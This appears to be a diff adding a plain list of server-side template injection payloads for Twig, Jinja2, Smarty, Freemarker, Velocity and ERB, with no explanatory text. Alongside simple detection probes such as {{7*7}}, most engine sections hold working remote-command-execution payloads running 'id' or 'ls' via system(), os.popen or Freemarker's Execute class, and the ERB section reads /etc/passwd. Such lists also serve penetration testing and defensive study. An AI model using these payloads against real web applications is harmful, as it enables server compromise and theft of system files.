@@ -1,0 +1,40 @@
+# SSTI payloads - template injection
+# Twig (PHP)
+{{7*7}}
+{{_self}}
+{{_self.env.display("test")}}
+{{_self.env.getRuntime("Twig\\Runtime\\EscaperRuntime")}}
+{{['id']|filter('system')}}
+{{['ls']|filter('system')}}
+
+# Jinja2 (Python)
+{{7*7}}
+{{config}}
+{{config.items()}}
+{{''.__class__.__mro__[1].__subclasses__()}}
+{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}
+
+# Smarty (PHP)
+{php}echo `id`;{/php}
+{$smarty.version}
+{system('ls')}
+
+# Freemarker (Java)
+${7*7}
+<#assign ex="freemarker.template.utility.Execute"?new()> ${ ex("id") }
+
+# Velocity (Java)
+#set($x=7*7)$x
+#set($str=$class.inspect("java.lang.String").type)
+$str.getClass().forName("java.lang.Runtime")
+
+# ERB (Ruby)
+<%= 7*7 %>
+<%= system('id') %>
+<%= File.open('/etc/passwd').read %>
+
+# Generic math evaluation
+${7*7}
+#{7*7}
+*{7*7}
+@{7*7}
